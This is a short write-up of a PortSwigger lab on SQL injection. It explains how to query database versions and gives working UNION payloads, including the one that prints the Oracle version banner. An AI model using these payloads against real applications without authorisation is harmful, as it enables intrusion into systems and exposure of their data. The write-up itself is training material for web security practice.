# SQL injection attack, querying the database type and version on Oracle

[Lab in PortSwigger](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

## Definition
Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

The queries to determine the database version for some popular database types are as follows:

| Database type 	 | Query                   |
| ------------------ | ----------------------- |
| Microsoft, MySQL 	 | SELECT @@version        |
| Oracle 	         | SELECT * FROM v$version |
| PostgreSQL 	     | SELECT version()        |

For example, you could use a UNION attack with the following input:
```sql
' UNION SELECT @@version--
```

This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

## Notes
This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

**DETERMINING THE NUMBER OF COLUMNS**  
The image below shows the behavior of the application when the payload tries to order the query result for a number that exceeds the maximum number of columns:
  
![Attempt 1](images/image01.png)

However, dwindling the number was possible to get the exact number of columns in the query statement, as shown by the image below:
  
![Attempt 2](images/image02.png)

**EXPLOITATION**  
To achieve the objective of this lab is necessary to inject an Oracle-specific SQL statement to print out its banner:
```sql
'+UNION+SELECT+null,banner+FROM+v$version--
```
![](images/image03.png)
  
![](images/image04.png)

## Key Words
> sql injection, sqlmap, version, oracle